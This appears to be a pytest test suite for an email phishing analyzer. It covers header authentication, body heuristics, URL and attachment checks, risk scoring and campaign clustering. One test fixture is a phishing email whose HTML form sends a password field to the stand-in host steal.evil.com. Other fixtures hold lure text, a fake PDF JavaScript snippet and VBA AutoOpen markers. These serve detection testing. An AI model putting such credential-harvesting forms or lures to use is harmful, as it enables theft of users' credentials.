"""
tests/test_core.py

Test suite per i moduli core di EMLyzer.
Eseguire con: pytest tests/ -v
"""

import sys
import os
from pathlib import Path

# Aggiungi backend al path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
from core.analysis.email_parser import parse_email_file, ParsedEmail
from core.analysis.header_analyzer import analyze_headers
from core.analysis.body_analyzer import analyze_body
from core.analysis.url_analyzer import analyze_urls, _analyze_single_url
from core.analysis.attachment_analyzer import analyze_attachments, analyze_attachment
from core.analysis.scorer import compute_risk_score


# ─────────────────────────────────────────────
# Fixture: carica le email campione
# ─────────────────────────────────────────────

SAMPLES_DIR = Path(__file__).parent.parent.parent / "samples"


def load_sample(filename: str) -> bytes:
    path = SAMPLES_DIR / filename
    assert path.exists(), f"Sample non trovato: {path}"
    return path.read_bytes()


@pytest.fixture
def phishing_email() -> ParsedEmail:
    raw = load_sample("phishing_sample.eml")
    return parse_email_file(raw, "phishing_sample.eml")


@pytest.fixture
def clean_email() -> ParsedEmail:
    raw = load_sample("clean_sample.eml")
    return parse_email_file(raw, "clean_sample.eml")


# ─────────────────────────────────────────────
# Test: Email Parser
# ─────────────────────────────────────────────

class TestEmailParser:

    def test_phishing_parsed_correctly(self, phishing_email):
        p = phishing_email
        assert p.mail_from != ""
        assert p.mail_subject != ""
        assert "suspended" in p.mail_subject.lower() or "urgent" in p.mail_subject.lower()
        assert p.file_hash_sha256 != ""
        assert len(p.file_hash_sha256) == 64
        assert p.parse_errors == []

    def test_phishing_has_body(self, phishing_email):
        p = phishing_email
        assert len(p.body_text) > 0 or len(p.body_html) > 0

    def test_phishing_auth_fields_extracted(self, phishing_email):
        p = phishing_email
        assert p.spf_result != "" or p.dkim_result != "" or p.dmarc_result != ""

    def test_phishing_originating_ip(self, phishing_email):
        p = phishing_email
        assert p.x_originating_ip != ""

    def test_phishing_campaign_id(self, phishing_email):
        p = phishing_email
        assert p.x_campaign_id != ""

    def test_clean_parsed_correctly(self, clean_email):
        p = clean_email
        assert "github" in p.mail_from.lower()
        assert p.spf_result == "pass"
        assert p.dkim_result == "pass"
        assert p.dmarc_result == "pass"
        assert p.parse_errors == []

    def test_hashes_are_consistent(self):
        raw = load_sample("phishing_sample.eml")
        p1 = parse_email_file(raw, "test.eml")
        p2 = parse_email_file(raw, "test.eml")
        assert p1.file_hash_sha256 == p2.file_hash_sha256

    def test_unsupported_extension_returns_error(self):
        p = parse_email_file(b"some content", "file.xyz")
        assert len(p.parse_errors) > 0

    def test_empty_file_handled(self):
        # Parser non deve crashare su file vuoto
        p = parse_email_file(b"", "empty.eml")
        assert isinstance(p, ParsedEmail)


# ─────────────────────────────────────────────
# Test: Header Analyzer
# ─────────────────────────────────────────────

class TestHeaderAnalyzer:

    def test_phishing_identity_mismatch(self, phishing_email):
        result = analyze_headers(phishing_email)
        assert len(result.identity_mismatches) > 0

    def test_phishing_auth_fail(self, phishing_email):
        result = analyze_headers(phishing_email)
        assert not result.spf_ok
        assert not result.dkim_ok
        assert not result.dmarc_ok

    def test_phishing_bulk_sender(self, phishing_email):
        result = analyze_headers(phishing_email)
        assert result.bulk_sender_detected
        assert "phpmailer" in result.bulk_sender_tool.lower()

    def test_phishing_has_findings(self, phishing_email):
        result = analyze_headers(phishing_email)
        assert len(result.findings) > 0

    def test_phishing_high_score(self, phishing_email):
        result = analyze_headers(phishing_email)
        assert result.score_contribution > 20

    def test_clean_auth_pass(self, clean_email):
        result = analyze_headers(clean_email)
        assert result.spf_ok
        assert result.dkim_ok
        assert result.dmarc_ok

    def test_clean_no_mismatch(self, clean_email):
        result = analyze_headers(clean_email)
        assert len(result.identity_mismatches) == 0

    def test_clean_low_score(self, clean_email):
        result = analyze_headers(clean_email)
        assert result.score_contribution < 20

    def test_score_is_bounded(self, phishing_email):
        result = analyze_headers(phishing_email)
        assert 0 <= result.score_contribution <= 100


# ─────────────────────────────────────────────
# Test: Body Analyzer
# ─────────────────────────────────────────────

class TestBodyAnalyzer:

    def test_phishing_urgency_detected(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.urgency_count > 0

    def test_phishing_cta_detected(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.phishing_cta_count > 0

    def test_phishing_credentials_detected(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.credential_keyword_count > 0

    def test_phishing_form_detected(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.forms_found > 0

    def test_phishing_js_detected(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.js_found

    def test_phishing_obfuscated_links(self, phishing_email):
        result = analyze_body(phishing_email)
        assert len(result.obfuscated_links) > 0

    def test_phishing_invisible_elements(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.invisible_elements > 0

    def test_phishing_urls_extracted(self, phishing_email):
        result = analyze_body(phishing_email)
        assert len(result.extracted_urls) > 0
        assert any("http" in u for u in result.extracted_urls)

    def test_phishing_high_score(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.score_contribution > 30

    def test_clean_no_urgency(self, clean_email):
        result = analyze_body(clean_email)
        assert result.urgency_count == 0
        assert result.forms_found == 0
        assert not result.js_found

    def test_clean_low_score(self, clean_email):
        result = analyze_body(clean_email)
        assert result.score_contribution < 15

    def test_findings_have_required_fields(self, phishing_email):
        result = analyze_body(phishing_email)
        for f in result.findings:
            assert hasattr(f, "severity")
            assert hasattr(f, "description")
            assert f.severity in ("info", "low", "medium", "high")


# ─────────────────────────────────────────────
# Test: URL Analyzer
# ─────────────────────────────────────────────

class TestURLAnalyzer:

    def test_ip_direct_detected(self):
        result = _analyze_single_url("http://185.220.101.47/phish/login.php")
        assert result.is_ip_address
        assert result.risk_score > 0

    def test_shortener_detected(self):
        result = _analyze_single_url("https://bit.ly/3xEvIlL1nk")
        assert result.is_shortener

    def test_punycode_detected(self):
        result = _analyze_single_url("http://xn--pypal-4ve.com/login")
        assert result.is_punycode

    def test_https_ok(self):
        result = _analyze_single_url("https://github.com/myorg/repo")
        assert result.https_used
        assert not result.is_ip_address
        assert not result.is_shortener

    def test_http_flagged(self):
        result = _analyze_single_url("http://example.com/page")
        findings = [f for f in result.findings if "HTTP" in f["description"] or "http" in f["description"].lower()]
        assert len(findings) > 0

    def test_empty_url_list(self):
        result = analyze_urls([])
        assert result.total_urls == 0
        assert result.score_contribution == 0

    def test_phishing_urls_analyzed(self, phishing_email):
        body = analyze_body(phishing_email)
        result = analyze_urls(body.extracted_urls, do_whois=False)
        assert result.total_urls > 0
        assert result.high_risk_count > 0

    def test_max_url_limit(self):
        urls = [f"http://example{i}.com" for i in range(100)]
        result = analyze_urls(urls)
        assert result.total_urls <= 50  # limite di sicurezza

    def test_url_deduplication(self):
        urls = ["http://evil.com/path"] * 10
        result = analyze_urls(urls)
        assert result.total_urls == 1


# ─────────────────────────────────────────────
# Test: Attachment Analyzer
# ─────────────────────────────────────────────

class TestAttachmentAnalyzer:

    def test_no_attachments(self):
        result = analyze_attachments([])
        assert result.total_attachments == 0
        assert result.score_contribution == 0

    def test_dangerous_extension_detected(self):
        att = {
            "filename": "invoice.exe",
            "size_bytes": 1024,
            "declared_mime": "application/octet-stream",
            "real_mime": "application/octet-stream",
            "mime_mismatch": False,
            "hash_md5": "a" * 32,
            "hash_sha1": "b" * 40,
            "hash_sha256": "c" * 64,
        }
        analysis = analyze_attachment(att)
        assert analysis.dangerous_extension
        assert any(f.severity == "critical" for f in analysis.findings)

    def test_double_extension_detected(self):
        att = {
            "filename": "document.pdf.exe",
            "size_bytes": 512,
            "declared_mime": "application/pdf",
            "real_mime": "application/octet-stream",
            "mime_mismatch": True,
            "hash_md5": "a" * 32,
            "hash_sha1": "b" * 40,
            "hash_sha256": "c" * 64,
        }
        analysis = analyze_attachment(att)
        assert analysis.double_extension

    def test_mime_mismatch_flagged(self):
        att = {
            "filename": "photo.jpg",
            "size_bytes": 2048,
            "declared_mime": "image/jpeg",
            "real_mime": "application/zip",
            "mime_mismatch": True,
            "hash_md5": "a" * 32,
            "hash_sha1": "b" * 40,
            "hash_sha256": "c" * 64,
        }
        analysis = analyze_attachment(att)
        assert any("MIME" in f.description for f in analysis.findings)

    def test_pdf_js_detection(self):
        """Testa rilevamento JS in PDF tramite pattern matching."""
        fake_pdf = b"%PDF-1.4\n/JS (app.alert('xss'))\n/JavaScript\neval(unescape()"
        att = {
            "filename": "invoice.pdf",
            "size_bytes": len(fake_pdf),
            "declared_mime": "application/pdf",
            "real_mime": "application/pdf",
            "mime_mismatch": False,
            "hash_md5": "a" * 32,
            "hash_sha1": "b" * 40,
            "hash_sha256": "c" * 64,
        }
        from core.analysis.attachment_analyzer import analyze_attachment
        analysis = analyze_attachment(att, raw_data=fake_pdf)
        assert analysis.has_js

    def test_vba_macro_detection(self):
        """Testa rilevamento macro VBA in OLE2."""
        # Magic bytes OLE2 + firma VBA
        fake_ole = b"\xD0\xCF\x11\xE0" + b"\x00" * 100 + b"_VBA_PROJECT" + b"\x00" * 100 + b"AutoOpen"
        att = {
            "filename": "macro.doc",
            "size_bytes": len(fake_ole),
            "declared_mime": "application/msword",
            "real_mime": "application/msword",
            "mime_mismatch": False,
            "hash_md5": "a" * 32,
            "hash_sha1": "b" * 40,
            "hash_sha256": "c" * 64,
        }
        analysis = analyze_attachment(att, raw_data=fake_ole)
        assert analysis.has_macro
        assert any(f.severity == "critical" for f in analysis.findings)


# ─────────────────────────────────────────────
# Test: Scorer
# ─────────────────────────────────────────────

class TestScorer:

    def test_phishing_high_risk(self, phishing_email):
        hr = analyze_headers(phishing_email)
        br = analyze_body(phishing_email)
        ur = analyze_urls(analyze_body(phishing_email).extracted_urls)
        ar = analyze_attachments(phishing_email.attachments)
        risk = compute_risk_score(hr, br, ur, ar)
        assert risk.score > 40
        assert risk.label in ("medium", "high", "critical")

    def test_clean_low_risk(self, clean_email):
        hr = analyze_headers(clean_email)
        br = analyze_body(clean_email)
        ur = analyze_urls(analyze_body(clean_email).extracted_urls)
        ar = analyze_attachments(clean_email.attachments)
        risk = compute_risk_score(hr, br, ur, ar)
        assert risk.score < 30
        assert risk.label in ("low", "medium")

    def test_score_bounded(self, phishing_email):
        hr = analyze_headers(phishing_email)
        br = analyze_body(phishing_email)
        ur = analyze_urls([])
        ar = analyze_attachments([])
        risk = compute_risk_score(hr, br, ur, ar)
        assert 0 <= risk.score <= 100

    def test_score_has_explanation(self, phishing_email):
        hr = analyze_headers(phishing_email)
        br = analyze_body(phishing_email)
        ur = analyze_urls(analyze_body(phishing_email).extracted_urls)
        ar = analyze_attachments(phishing_email.attachments)
        risk = compute_risk_score(hr, br, ur, ar)
        assert len(risk.explanation) > 0
        assert len(risk.contributions) == 4

    def test_reputation_boost(self, phishing_email):
        hr = analyze_headers(phishing_email)
        br = analyze_body(phishing_email)
        ur = analyze_urls([])
        ar = analyze_attachments([])
        risk_no_rep = compute_risk_score(hr, br, ur, ar, reputation_boost=0)
        risk_with_rep = compute_risk_score(hr, br, ur, ar, reputation_boost=100)
        assert risk_with_rep.score >= risk_no_rep.score

    def test_none_modules_handled(self):
        """Lo scorer deve gestire moduli None senza crashare."""
        risk = compute_risk_score(None, None, None, None)
        assert risk.score == 0
        assert risk.label == "low"

    def test_label_consistency(self, phishing_email):
        hr = analyze_headers(phishing_email)
        br = analyze_body(phishing_email)
        ur = analyze_urls([])
        ar = analyze_attachments([])
        risk = compute_risk_score(hr, br, ur, ar)
        assert risk.label in ("low", "medium", "high", "critical")
        assert risk.label_text != ""


# ─────────────────────────────────────────────
# Test: i18n
# ─────────────────────────────────────────────

class TestI18n:

    def test_italian_default(self):
        from utils.i18n import t
        assert t('risk.low', lang='it') == "Basso rischio"
        assert t('risk.high', lang='it') == "Alto rischio"
        assert t('risk.critical', lang='it') == "Rischio critico"

    def test_english(self):
        from utils.i18n import t
        assert t('risk.low', lang='en') == "Low risk"
        assert t('risk.high', lang='en') == "High risk"
        assert t('risk.critical', lang='en') == "Critical risk"

    def test_kwargs_interpolation(self):
        from utils.i18n import t
        it = t('url.new_domain', lang='it', days=5)
        en = t('url.new_domain', lang='en', days=5)
        assert '5' in it
        assert '5' in en
        assert 'giorni' in it
        assert 'days' in en

    def test_count_interpolation(self):
        from utils.i18n import t
        it = t('body.hidden_elements', lang='it', count=7)
        en = t('body.hidden_elements', lang='en', count=7)
        assert '7' in it
        assert '7' in en

    def test_missing_key_returns_key(self):
        from utils.i18n import t
        result = t('questa.chiave.non.esiste')
        assert result == 'questa.chiave.non.esiste'

    def test_invalid_lang_falls_back_to_it(self):
        from utils.i18n import t
        result = t('risk.low', lang='xx')
        assert result == "Basso rischio"

    def test_all_keys_have_both_languages(self):
        from utils.i18n import TRANSLATIONS
        missing = []
        for key, entry in TRANSLATIONS.items():
            if 'it' not in entry:
                missing.append(f"{key}: missing 'it'")
            if 'en' not in entry:
                missing.append(f"{key}: missing 'en'")
        assert missing == [], f"Chiavi incomplete: {missing}"

    def test_findings_use_i18n(self, phishing_email):
        """I finding degli analizzatori devono usare le stringhe i18n."""
        result = analyze_headers(phishing_email)
        descs = [f.description for f in result.findings]
        # Con lingua default 'it', almeno un finding deve avere testo italiano
        has_it = any('Mismatch' in d or 'rilevato' in d or 'result' in d.lower()
                     for d in descs)
        assert has_it, f"Nessun finding localizzato. Trovati: {descs}"


# ─────────────────────────────────────────────
# Test: Input manuale / raw_looks_like_eml
# ─────────────────────────────────────────────

class TestManualInput:

    def test_valid_email_recognized(self):
        from core.analysis.email_parser import raw_looks_like_eml
        src = b"From: a@b.com\nTo: c@d.com\nSubject: Test\n\nBody"
        assert raw_looks_like_eml(src) is True

    def test_random_text_not_recognized(self):
        from core.analysis.email_parser import raw_looks_like_eml
        src = b"Questo non e' una email, e' solo testo casuale senza header."
        assert raw_looks_like_eml(src) is False

    def test_manual_source_parses_correctly(self):
        manual = """From: "Attacker" <evil@evil.com>
To: victim@example.com
Subject: Test manual
Date: Mon, 1 Jan 2024 10:00:00 +0000
Return-Path: <other@different.com>

Click here now to verify your account immediately."""
        raw = manual.encode("utf-8")
        parsed = parse_email_file(raw, "manual.eml")
        assert parsed.mail_subject == "Test manual"
        assert parsed.mail_from != ""
        assert parsed.parse_errors == []

    def test_manual_phishing_gets_risk_score(self):
        manual = """From: "Security" <sec@paypa1-fake.com>
To: user@example.com
Subject: URGENT account suspended
Date: Mon, 1 Jan 2024 10:00:00 +0000
Return-Path: <bounce@totally-other.ru>
X-Mailer: PHPMailer 6.0
Authentication-Results: mx.example.com; spf=fail; dkim=fail; dmarc=fail
MIME-Version: 1.0
Content-Type: text/html

<html><body>
<form action="http://steal.evil.com/"><input name="password"></form>
<a href="http://185.0.0.1/phish">Verify at http://www.paypal.com</a>
<p style="display:none">hidden bypass text</p>
URGENT: Click here immediately. Provide your credentials now.
</body></html>"""
        raw = manual.encode("utf-8")
        from core.analysis.email_parser import parse_email_file
        from core.analysis.header_analyzer import analyze_headers
        from core.analysis.body_analyzer import analyze_body
        from core.analysis.url_analyzer import analyze_urls
        from core.analysis.attachment_analyzer import analyze_attachments
        from core.analysis.scorer import compute_risk_score
        parsed = parse_email_file(raw, "manual.eml")
        h = analyze_headers(parsed)
        b = analyze_body(parsed)
        u = analyze_urls(b.extracted_urls)
        a = analyze_attachments(parsed.attachments)
        risk = compute_risk_score(h, b, u, a)
        assert risk.score > 30
        assert risk.label in ('medium', 'high', 'critical')


# ─────────────────────────────────────────────
# Test: HTML nascosto estratto
# ─────────────────────────────────────────────

class TestHiddenHTMLExtraction:

    def test_hidden_content_extracted(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.invisible_elements > 0
        assert result.raw_hidden_content.strip() != ""

    def test_hidden_content_contains_spam_text(self, phishing_email):
        result = analyze_body(phishing_email)
        # Il sample contiene "filler text to bypass spam filters"
        assert len(result.raw_hidden_content) > 5

    def test_no_hidden_in_clean_email(self, clean_email):
        result = analyze_body(clean_email)
        assert result.invisible_elements == 0
        assert result.raw_hidden_content == ""

    def test_invisible_elements_field_in_result(self, phishing_email):
        result = analyze_body(phishing_email)
        assert hasattr(result, 'invisible_elements')
        assert hasattr(result, 'raw_hidden_content')
        assert isinstance(result.invisible_elements, int)
        assert isinstance(result.raw_hidden_content, str)


# ─────────────────────────────────────────────
# Test: NLP Classifier
# ─────────────────────────────────────────────

class TestNLPClassifier:

    def test_classifier_available(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text("urgent verify account immediately click here credentials")
        assert r.available is True

    def test_phishing_text_detected(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text(
            "URGENT: your account has been suspended verify credentials immediately "
            "click here now to confirm your password and credit card information"
        )
        assert r.available
        assert r.label in ('phishing', 'suspicious')
        assert r.phishing_probability >= 0.5

    def test_legitimate_text_not_flagged(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text(
            "Hi team the meeting is scheduled for tomorrow at 3pm "
            "please find attached the quarterly report for review"
        )
        assert r.available
        assert r.label in ('legitimate', 'suspicious')
        assert r.phishing_probability < 0.7

    def test_empty_text_returns_unknown(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text("", "")
        assert r.label == "unknown"

    def test_html_phishing_detected(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text("", "<html><body>"
            "<h1>URGENT ACTION REQUIRED</h1>"
            "<p>Verify your account immediately provide credentials</p>"
            "<form><input name='password'></form>"
            "</body></html>")
        assert r.available
        assert r.phishing_probability >= 0.5

    def test_probability_in_range(self):
        from core.analysis.nlp_classifier import classify_text
        for text in ["test", "urgent click verify", "meeting tomorrow agenda"]:
            r = classify_text(text)
            assert 0.0 <= r.phishing_probability <= 1.0

    def test_score_contribution_bounded(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text("urgent verify account credentials immediately click")
        assert 0.0 <= r.score_contribution <= 40.0

    def test_confidence_values(self):
        from core.analysis.nlp_classifier import classify_text
        r = classify_text("urgent click verify account suspended credentials now")
        assert r.confidence in ('low', 'medium', 'high', 'n/a')

    def test_nlp_integrated_in_body_analyzer(self, phishing_email):
        result = analyze_body(phishing_email)
        assert result.nlp_result is not None
        assert result.nlp_result.available is True
        assert result.nlp_result.label in ('phishing', 'suspicious')

    def test_nlp_finding_added_for_phishing(self, phishing_email):
        result = analyze_body(phishing_email)
        nlp_findings = [f for f in result.findings if f.category == 'nlp']
        assert len(nlp_findings) >= 1
        assert '%' in nlp_findings[0].description  # i18n interpolation worked

    def test_nlp_no_finding_for_legitimate(self, clean_email):
        result = analyze_body(clean_email)
        nlp_findings = [f for f in result.findings if f.category == 'nlp']
        # Email legittima non deve avere finding NLP
        assert len(nlp_findings) == 0


# ─────────────────────────────────────────────
# Test: PATCH notes e WHOIS toggle (HTTP)
# ─────────────────────────────────────────────

class TestHTTPNotes:

    @pytest.fixture
    def anyio_backend(self):
        return "asyncio"

    @pytest.mark.asyncio
    async def test_notes_save_and_retrieve(self):
        from httpx import AsyncClient, ASGITransport
        from main import app
        from models.database import init_db
        await init_db()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            samples = Path(__file__).parent.parent.parent / "samples"
            with open(samples / "phishing_sample.eml", "rb") as f:
                r = await c.post("/api/upload/", files={"file": ("t.eml", f, "application/octet-stream")})
            job_id = r.json()["job_id"]
            await c.post(f"/api/analysis/{job_id}")

            r = await c.patch(f"/api/analysis/{job_id}/notes",
                json={"notes": "Test nota"}, headers={"Content-Type": "application/json"})
            assert r.status_code == 200
            assert r.json()["analyst_notes"] == "Test nota"

            r = await c.get(f"/api/analysis/{job_id}")
            assert r.json()["analyst_notes"] == "Test nota"

    @pytest.mark.asyncio
    async def test_notes_too_long(self):
        from httpx import AsyncClient, ASGITransport
        from main import app
        from models.database import init_db
        await init_db()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            samples = Path(__file__).parent.parent.parent / "samples"
            with open(samples / "clean_sample.eml", "rb") as f:
                r = await c.post("/api/upload/", files={"file": ("t.eml", f, "application/octet-stream")})
            job_id = r.json()["job_id"]
            await c.post(f"/api/analysis/{job_id}")

            r = await c.patch(f"/api/analysis/{job_id}/notes",
                json={"notes": "x" * 10001}, headers={"Content-Type": "application/json"})
            assert r.status_code == 400

    @pytest.mark.asyncio
    async def test_list_with_filter(self):
        from httpx import AsyncClient, ASGITransport
        from main import app
        from models.database import init_db
        await init_db()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            # Lista base
            r = await c.get("/api/analysis/")
            assert r.status_code == 200
            data = r.json()
            assert "items" in data and "total" in data and "pages" in data

            # Ricerca senza risultati
            r = await c.get("/api/analysis/?q=XXXXXXNOTFOUND99999")
            assert r.json()["total"] == 0

            # Filtro risk
            r = await c.get("/api/analysis/?risk=low,medium,high,critical")
            assert r.status_code == 200

            # Paginazione
            r = await c.get("/api/analysis/?page=1&page_size=2")
            assert len(r.json()["items"]) <= 2


# ─────────────────────────────────────────────
# Test: Campaign Detector
# ─────────────────────────────────────────────

class TestCampaignDetector:

    def _make_email(self, job_id, subject="", mail_from="a@b.com",
                    message_id="", body_hash="", campaign_id="",
                    risk_label="high", risk_score=60.0):
        from core.analysis.campaign_detector import EmailSummary
        return EmailSummary(
            job_id=job_id,
            subject=subject,
            mail_from=mail_from,
            message_id=message_id,
            body_hash=body_hash,
            x_campaign_id=campaign_id,
            risk_label=risk_label,
            risk_score=risk_score,
        )

    def test_empty_returns_no_clusters(self):
        from core.analysis.campaign_detector import detect_campaigns
        report = detect_campaigns([])
        assert report.clusters_found == 0
        assert report.total_emails_analyzed == 0

    def test_single_email_no_cluster(self):
        from core.analysis.campaign_detector import detect_campaigns
        emails = [self._make_email("id1", subject="URGENT verify account")]
        report = detect_campaigns(emails)
        assert report.clusters_found == 0
        assert report.isolated_emails == 1

    def test_identical_body_hash_clustered(self):
        from core.analysis.campaign_detector import detect_campaigns
        body_hash = "a" * 64
        emails = [
            self._make_email("id1", body_hash=body_hash),
            self._make_email("id2", body_hash=body_hash),
            self._make_email("id3", body_hash=body_hash),
        ]
        report = detect_campaigns(emails)
        assert report.clusters_found >= 1
        body_clusters = [c for c in report.clusters if c.similarity_type == "body_hash"]
        assert len(body_clusters) >= 1
        assert body_clusters[0].email_count == 3

    def test_similar_subjects_clustered(self):
        from core.analysis.campaign_detector import detect_campaigns
        emails = [
            self._make_email("id1", subject="URGENT verify your account immediately"),
            self._make_email("id2", subject="URGENT verify your account now action required"),
            self._make_email("id3", subject="completely different topic meeting tomorrow"),
        ]
        report = detect_campaigns(emails, subject_threshold=0.4)
        subj_clusters = [c for c in report.clusters if c.similarity_type == "subject"]
        assert len(subj_clusters) >= 1
        assert "id1" in subj_clusters[0].job_ids
        assert "id2" in subj_clusters[0].job_ids
        assert "id3" not in subj_clusters[0].job_ids

    def test_campaign_id_clustered(self):
        from core.analysis.campaign_detector import detect_campaigns
        emails = [
            self._make_email("id1", campaign_id="campaign-xyz-2024"),
            self._make_email("id2", campaign_id="campaign-xyz-2024"),
        ]
        report = detect_campaigns(emails)
        camp_clusters = [c for c in report.clusters if c.similarity_type == "campaign_id"]
        assert len(camp_clusters) >= 1
        assert camp_clusters[0].email_count == 2

    def test_message_id_domain_clustered(self):
        from core.analysis.campaign_detector import detect_campaigns
        emails = [
            self._make_email("id1", message_id="<abc123@evil-sender.com>"),
            self._make_email("id2", message_id="<xyz789@evil-sender.com>"),
        ]
        report = detect_campaigns(emails)
        mid_clusters = [c for c in report.clusters if c.similarity_type == "message_id"]
        assert len(mid_clusters) >= 1

    def test_sender_domain_clustered_high_risk(self):
        from core.analysis.campaign_detector import detect_campaigns
        emails = [
            self._make_email("id1", mail_from="sec@paypa1-fake.com", risk_label="high"),
            self._make_email("id2", mail_from="support@paypa1-fake.com", risk_label="critical"),
        ]
        report = detect_campaigns(emails)
        domain_clusters = [c for c in report.clusters if c.similarity_type == "sender_domain"]
        assert len(domain_clusters) >= 1

    def test_isolated_count_correct(self):
        from core.analysis.campaign_detector import detect_campaigns
        body_hash = "b" * 64
        emails = [
            self._make_email("id1", body_hash=body_hash),
            self._make_email("id2", body_hash=body_hash),
            self._make_email("id3", subject="completely unique unrelated email"),
        ]
        report = detect_campaigns(emails)
        assert report.isolated_emails == 1

    def test_cluster_has_max_risk_score(self):
        from core.analysis.campaign_detector import detect_campaigns
        body_hash = "c" * 64
        emails = [
            self._make_email("id1", body_hash=body_hash, risk_score=45.0),
            self._make_email("id2", body_hash=body_hash, risk_score=78.0),
        ]
        report = detect_campaigns(emails)
        assert report.clusters[0].max_risk_score == 78.0

    def test_jaccard_similarity(self):
        from core.analysis.campaign_detector import _subject_tokens, _jaccard
        a = _subject_tokens("urgent verify your account immediately")
        b = _subject_tokens("urgent verify account immediately action required")
        sim = _jaccard(a, b)
        assert sim > 0.4

    def test_jaccard_dissimilar(self):
        from core.analysis.campaign_detector import _subject_tokens, _jaccard
        a = _subject_tokens("team meeting tomorrow at 3pm agenda")
        b = _subject_tokens("urgent verify credentials immediately suspended")
        sim = _jaccard(a, b)
        assert sim < 0.3

    @pytest.mark.asyncio
    async def test_campaigns_endpoint(self):
        from httpx import AsyncClient, ASGITransport
        from main import app
        from models.database import init_db
        await init_db()

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            r = await c.get("/api/campaigns/")
            assert r.status_code == 200
            data = r.json()
            assert "clusters_found" in data
            assert "total_emails_analyzed" in data
            assert "clusters" in data

            # Test con threshold personalizzato
            r2 = await c.get("/api/campaigns/?threshold=0.8&min_size=2")
            assert r2.status_code == 200
